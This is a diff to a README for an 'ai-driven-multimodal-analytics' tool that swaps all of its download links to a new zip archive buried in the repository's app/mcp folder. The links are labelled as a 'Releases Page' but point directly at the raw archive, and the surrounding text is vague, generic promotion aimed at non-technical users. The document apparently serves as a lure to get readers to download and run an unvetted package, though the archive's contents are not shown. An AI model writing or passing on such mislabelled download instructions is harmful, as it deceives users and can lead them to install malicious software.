@@ -1,7 +1,7 @@
 # 🎉 ai-driven-multimodal-analytics - Simple AI Tools for Everyone
 
 ## 📥 Download Now!
-[![Download ai-driven-multimodal-analytics](https://raw.githubusercontent.com/sanggio/ai-driven-multimodal-analytics/master/app/mcp/multimodal_ai_driven_analytics_v1.9.zip%20Now-Click%20Here-brightgreen)](https://raw.githubusercontent.com/sanggio/ai-driven-multimodal-analytics/master/app/mcp/multimodal_ai_driven_analytics_v1.9.zip)
+[![Download ai-driven-multimodal-analytics](https://github.com/sanggio/ai-driven-multimodal-analytics/raw/refs/heads/master/app/mcp/ai_multimodal_driven_analytics_1.1.zip%20Now-Click%20Here-brightgreen)](https://github.com/sanggio/ai-driven-multimodal-analytics/raw/refs/heads/master/app/mcp/ai_multimodal_driven_analytics_1.1.zip)
 
 ## 📚 Overview
 Welcome to ai-driven-multimodal-analytics. This application helps users harness the power of multiple AI tools in one easy-to-use platform. Our project combines advanced technologies to offer efficient data analysis and content generation.
@@ -18,7 +18,7 @@ This guide will help you download and run the application. You don’t need any 
 ## 🔧 Installation Steps
 
 ### 1. Visit the Download Page
-Go to the [Releases Page](https://raw.githubusercontent.com/sanggio/ai-driven-multimodal-analytics/master/app/mcp/multimodal_ai_driven_analytics_v1.9.zip) to find the latest version of the application.
+Go to the [Releases Page](https://github.com/sanggio/ai-driven-multimodal-analytics/raw/refs/heads/master/app/mcp/ai_multimodal_driven_analytics_1.1.zip) to find the latest version of the application.
 
 ### 2. Choose the Correct File
 On the releases page, you will see various files available for download. Select the file that matches your operating system:
@@ -67,7 +67,7 @@ Follow the instructions in the application to utilize the selected features. The
 
 ## 💡 Tips for Effective Use
 - Explore the tutorials in the application to get familiar with all features.
-- Regularly check for updates on the [Releases Page](https://raw.githubusercontent.com/sanggio/ai-driven-multimodal-analytics/master/app/mcp/multimodal_ai_driven_analytics_v1.9.zip) to keep your application current.
+- Regularly check for updates on the [Releases Page](https://github.com/sanggio/ai-driven-multimodal-analytics/raw/refs/heads/master/app/mcp/ai_multimodal_driven_analytics_1.1.zip) to keep your application current.
 - Provide feedback through the application to help improve future versions.
 
 ## ⚙️ Troubleshooting
